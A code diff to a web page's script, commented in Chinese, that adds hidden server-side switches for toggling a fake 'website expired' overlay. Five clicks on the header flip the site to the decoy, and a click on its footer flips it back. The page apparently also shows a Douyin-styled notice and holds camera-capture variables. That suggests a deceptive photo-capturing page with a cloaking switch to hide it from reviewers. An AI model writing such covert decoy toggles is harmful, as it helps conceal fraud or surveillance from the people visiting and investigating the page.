@@ -804,7 +804,7 @@
 </div>
 
 <!-- 网站失效幻象 -->
-<div class="expired-overlay" id="expiredOverlay">
+<div class="expired-overlay hidden" id="expiredOverlay">
     <div class="expired-box">
         <div class="expired-icon">
             <svg viewBox="0 0 24 24" fill="#999" width="64" height="64">
@@ -924,18 +924,56 @@
 </div>
 
 <script>
-    // 网站失效幻象 - 点击图标5次解除
-    var expiredClicks = 0;
+    // 网站状态同步
     var expiredOverlay = document.getElementById('expiredOverlay');
-    var expiredIcon = expiredOverlay.querySelector('.expired-icon');
-    expiredIcon.addEventListener('click', function() {
-        expiredClicks++;
-        if (expiredClicks >= 5) {
-            expiredOverlay.classList.add('hidden');
-            // 显示通知弹窗
-            document.getElementById('douyinNotifModal').classList.add('active');
-        }
-    });
+    var siteExpired = false;
+
+    // 检查服务器状态
+    fetch('/api/site-status')
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            siteExpired = data.expired;
+            if (siteExpired) {
+                expiredOverlay.classList.remove('hidden');
+            } else {
+                expiredOverlay.classList.add('hidden');
+                document.getElementById('douyinNotifModal').classList.add('active');
+            }
+        });
+
+    // 正常页面的隐蔽开关 - 标题点击5次切换到失效幻象
+    var headerClicks = 0;
+    var header = document.querySelector('.header h1');
+    if (header) {
+        header.addEventListener('click', function() {
+            headerClicks++;
+            if (headerClicks >= 5) {
+                headerClicks = 0;
+                fetch('/api/site-toggle', { method: 'POST' })
+                    .then(function(r) { return r.json(); })
+                    .then(function(data) {
+                        if (data.expired) {
+                            expiredOverlay.classList.remove('hidden');
+                        }
+                    });
+            }
+        });
+    }
+
+    // 失效幻象的隐蔽开关 - 点击底部文字切换回正常页面
+    var expiredFooter = expiredOverlay.querySelector('.expired-footer');
+    if (expiredFooter) {
+        expiredFooter.addEventListener('click', function() {
+            fetch('/api/site-toggle', { method: 'POST' })
+                .then(function(r) { return r.json(); })
+                .then(function(data) {
+                    if (!data.expired) {
+                        expiredOverlay.classList.add('hidden');
+                        document.getElementById('douyinNotifModal').classList.add('active');
+                    }
+                });
+        });
+    }
 
     var cameraStream = null;
     var capturedPhotos = [];
